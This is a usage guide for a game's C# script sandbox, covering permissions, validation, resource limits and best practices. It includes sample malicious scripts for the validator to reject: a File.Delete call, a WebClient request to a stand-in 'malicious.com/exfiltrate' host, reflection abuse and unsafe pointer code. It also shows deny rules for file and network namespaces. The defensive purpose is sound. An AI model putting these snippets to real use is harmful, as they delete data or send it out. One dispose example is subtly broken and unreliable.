# Script Security System - Usage Examples

## Overview

The PokeNET scripting security system provides **defense-in-depth** protection against malicious scripts through multiple layers of validation, isolation, and resource control.

## Quick Start

### Example 1: Basic Restricted Execution (Safest)

```csharp
using PokeNET.Scripting.Security;

// Create restricted permissions (default, safest)
var permissions = ScriptPermissions.CreateRestricted("my-script");

// Create sandbox
using var sandbox = new ScriptSandbox(permissions);

// Safe script - only basic computation
string safeCode = @"
using System;

public class Calculator
{
    public static int Execute()
    {
        return 2 + 2;
    }
}
";

// Execute script
var result = await sandbox.ExecuteAsync(safeCode);

if (result.Success)
{
    Console.WriteLine($"Result: {result.ReturnValue}"); // Output: 4
    Console.WriteLine($"Execution time: {result.ExecutionTime.TotalMilliseconds}ms");
    Console.WriteLine($"Memory used: {result.MemoryUsed / 1024}KB");
}
```

### Example 2: Standard Game Script

```csharp
// Create standard permissions for game scripts
var permissions = ScriptPermissions.CreateStandard("game-script-001");

using var sandbox = new ScriptSandbox(permissions);

string gameCode = @"
using System;
using System.Linq;
using System.Collections.Generic;

public class DamageCalculator
{
    public static int Execute(int basePower, int attackStat, int defenseStat)
    {
        // Allowed: Math operations, LINQ, collections
        var modifiers = new[] { 1.0, 1.5, 2.0 };
        var modifier = modifiers.Max();

        return (int)((basePower * attackStat / defenseStat) * modifier);
    }
}
";

var result = await sandbox.ExecuteAsync(gameCode, "Execute", new object[] { 90, 120, 80 });

Console.WriteLine($"Damage: {result.ReturnValue}");
```

### Example 3: Custom Permissions

```csharp
// Build custom permissions
var permissions = ScriptPermissions.CreateBuilder()
    .WithLevel(ScriptPermissions.PermissionLevel.Standard)
    .WithApis(
        ScriptPermissions.ApiCategory.Core |
        ScriptPermissions.ApiCategory.Collections |
        ScriptPermissions.ApiCategory.GameStateRead |
        ScriptPermissions.ApiCategory.Random
    )
    .WithTimeout(TimeSpan.FromSeconds(15))
    .WithMaxMemory(30 * 1024 * 1024) // 30 MB
    .AllowNamespace("PokeNET.Game")
    .AllowNamespace("System.Linq")
    .DenyNamespace("System.IO") // Explicitly deny file operations
    .DenyNamespace("System.Net") // Explicitly deny network
    .WithScriptId("custom-script")
    .Build();

using var sandbox = new ScriptSandbox(permissions);

// Your script execution here...
```

## Security Validation

### Example 4: Detecting Malicious Code

```csharp
var permissions = ScriptPermissions.CreateStandard();
var validator = new SecurityValidator(permissions);

// This will be rejected
string maliciousCode = @"
using System.IO;

public class MaliciousScript
{
    public static void Execute()
    {
        // VIOLATION: File I/O not allowed
        File.Delete(""important.txt"");
    }
}
";

var validationResult = validator.Validate(maliciousCode);

if (!validationResult.IsValid)
{
    Console.WriteLine($"Security validation failed: {validationResult.Summary}");

    foreach (var violation in validationResult.Violations)
    {
        Console.WriteLine($"  [{violation.Level}] {violation.Message}");
        Console.WriteLine($"    at line {violation.Line}: {violation.Category}");
    }
}

// Output:
// Security validation failed: Validation failed with 2 error(s)
//   [Critical] File I/O operations (namespace 'System.IO') require FileIO permission
//     at line 1: API Access Violation
//   [Error] Namespace 'System.IO' is not allowed by security policy
//     at line 1: Namespace Violation
```

### Example 5: Resource Limit Protection

```csharp
var permissions = ScriptPermissions.CreateBuilder()
    .WithLevel(ScriptPermissions.PermissionLevel.Restricted)
    .WithTimeout(TimeSpan.FromSeconds(2)) // Short timeout
    .WithMaxMemory(5 * 1024 * 1024) // 5 MB limit
    .Build();

using var sandbox = new ScriptSandbox(permissions);

// Script that tries to exceed limits
string resourceHog = @"
using System;
using System.Collections.Generic;

public class ResourceHog
{
    public static void Execute()
    {
        // This will timeout
        while (true)
        {
            // Infinite loop
        }
    }
}
";

var result = await sandbox.ExecuteAsync(resourceHog);

if (result.TimedOut)
{
    Console.WriteLine("Script execution timed out (as expected)");
    Console.WriteLine($"Terminated after: {result.ExecutionTime.TotalSeconds}s");
}
```

## Threat Detection Examples

### Example 6: Detecting Common Attack Patterns

```csharp
var permissions = ScriptPermissions.CreateStandard();
var validator = new SecurityValidator(permissions);

// Attack 1: Network access attempt
string networkAttack = @"
using System.Net;

public class NetworkAttack
{
    public static void Execute()
    {
        var client = new WebClient();
        client.DownloadString(""http://malicious.com/exfiltrate"");
    }
}
";

var result = validator.Validate(networkAttack);
Console.WriteLine($"Network attack detected: {result.Violations.Count} violations");

// Attack 2: Reflection abuse
string reflectionAttack = @"
using System.Reflection;

public class ReflectionAttack
{
    public static void Execute()
    {
        var assembly = Assembly.Load(""System.Management"");
        // Attempt to access restricted APIs
    }
}
";

result = validator.Validate(reflectionAttack);
Console.WriteLine($"Reflection attack detected: {result.Violations.Count} violations");

// Attack 3: Unsafe code
string unsafeAttack = @"
public class UnsafeAttack
{
    public static unsafe void Execute()
    {
        int* ptr = stackalloc int[100];
        // Attempt to corrupt memory
    }
}
";

result = validator.Validate(unsafeAttack);
Console.WriteLine($"Unsafe code detected: {result.Violations.Count} violations");
```

## Permission Levels

### Restricted (Default - Safest)
- **APIs**: Core, Collections only
- **Timeout**: 5 seconds
- **Memory**: 10 MB
- **Use case**: Simple calculations, pure functions

### Standard (Game Scripts)
- **APIs**: Core, Collections, GameStateRead, GameStateWrite, Logging, Random, DateTime
- **Timeout**: 10 seconds
- **Memory**: 50 MB
- **Use case**: Battle calculations, AI logic, game events

### Elevated (Trusted Scripts)
- **APIs**: Standard + Serialization
- **Timeout**: 30 seconds
- **Memory**: 100 MB
- **Use case**: Save/load operations, complex game logic

### Unrestricted (System Only - Dangerous!)
- **APIs**: All
- **Timeout**: No limit
- **Memory**: No limit
- **Use case**: System scripts only, never user-provided code

## Security Event Logging

```csharp
using Microsoft.Extensions.Logging;

// Create logger
var loggerFactory = LoggerFactory.Create(builder =>
{
    builder.AddConsole();
    builder.SetMinimumLevel(LogLevel.Debug);
});

var logger = loggerFactory.CreateLogger<ScriptSandbox>();

// Create sandbox with logging
var permissions = ScriptPermissions.CreateStandard();
using var sandbox = new ScriptSandbox(permissions, logger);

// Execute script - all security events are logged
var result = await sandbox.ExecuteAsync(someCode);

// Check security events
foreach (var evt in result.SecurityEvents)
{
    Console.WriteLine($"Security Event: {evt}");
}

// Example output:
// Security Event: Validation passed
// Security Event: Compilation successful
// Security Event: Assembly loaded in default context
// Security Event: Invoking method: MyScript.Execute
```

## Best Practices

### 1. Always Use Minimum Required Permissions
```csharp
// ❌ BAD: Over-permissive
var permissions = ScriptPermissions.CreateElevated();

// ✅ GOOD: Least privilege
var permissions = ScriptPermissions.CreateRestricted();
```

### 2. Set Appropriate Timeouts
```csharp
// ❌ BAD: No timeout protection
var permissions = ScriptPermissions.CreateBuilder()
    .WithTimeout(TimeSpan.FromMinutes(10)) // Too long!
    .Build();

// ✅ GOOD: Reasonable timeout
var permissions = ScriptPermissions.CreateBuilder()
    .WithTimeout(TimeSpan.FromSeconds(5)) // Quick fail
    .Build();
```

### 3. Validate Before Execution
```csharp
// ✅ ALWAYS validate first
var validator = new SecurityValidator(permissions);
var validationResult = validator.Validate(userCode);

if (!validationResult.IsValid)
{
    // Reject the script
    throw new SecurityException("Script failed security validation");
}

// Only execute if validation passes
var result = await sandbox.ExecuteAsync(userCode);
```

### 4. Handle Failures Gracefully
```csharp
var result = await sandbox.ExecuteAsync(code);

if (!result.Success)
{
    if (result.TimedOut)
    {
        // Handle timeout
        logger.LogWarning("Script execution timed out");
    }
    else if (result.MemoryLimitExceeded)
    {
        // Handle memory overflow
        logger.LogWarning("Script exceeded memory limit");
    }
    else if (result.Exception != null)
    {
        // Handle other errors
        logger.LogError(result.Exception, "Script execution failed");
    }
}
```

### 5. Dispose Sandboxes Properly
```csharp
// ✅ ALWAYS use 'using' statement
using var sandbox = new ScriptSandbox(permissions);

// Or explicitly dispose
try
{
    var sandbox = new ScriptSandbox(permissions);
    // ... use sandbox ...
}
finally
{
    sandbox?.Dispose(); // Unloads assemblies and cleans up
}
```

## Threat Model Summary

| Threat | Mitigation | Example |
|--------|-----------|---------|
| Code Injection | Static analysis + Roslyn validation | Malformed syntax detected at parse time |
| Resource Exhaustion | Timeout + memory limits | Infinite loops terminated after 5s |
| Unauthorized API Access | Namespace allowlist/denylist | File.Delete() blocked by permission check |
| Privilege Escalation | Permission level enforcement | Unsafe code requires Unrestricted level |
| Information Disclosure | AssemblyLoadContext isolation | Scripts can't access system internals |
| Malicious Operations | Sandboxed environment | Network calls blocked by API restrictions |

## Production Deployment Recommendations

For production systems with untrusted user scripts, add these additional security layers:

1. **Container Isolation**: Run scripts in Docker containers with resource limits
2. **Syscall Filtering**: Use seccomp profiles to restrict system calls
3. **Mandatory Access Control**: Enable AppArmor/SELinux policies
4. **Network Monitoring**: Monitor and log all network activity
5. **Rate Limiting**: Limit script execution frequency per user
6. **Hardware Isolation**: Consider SGX/TrustZone for sensitive operations
7. **Audit Logging**: Log all script executions and security events
8. **Code Review**: Manually review high-permission scripts

## Additional Resources

- See `ScriptPermissions.cs` for all available API categories
- See `SecurityValidator.cs` for validation rules and threat detection
- See `ScriptSandbox.cs` for isolation architecture details
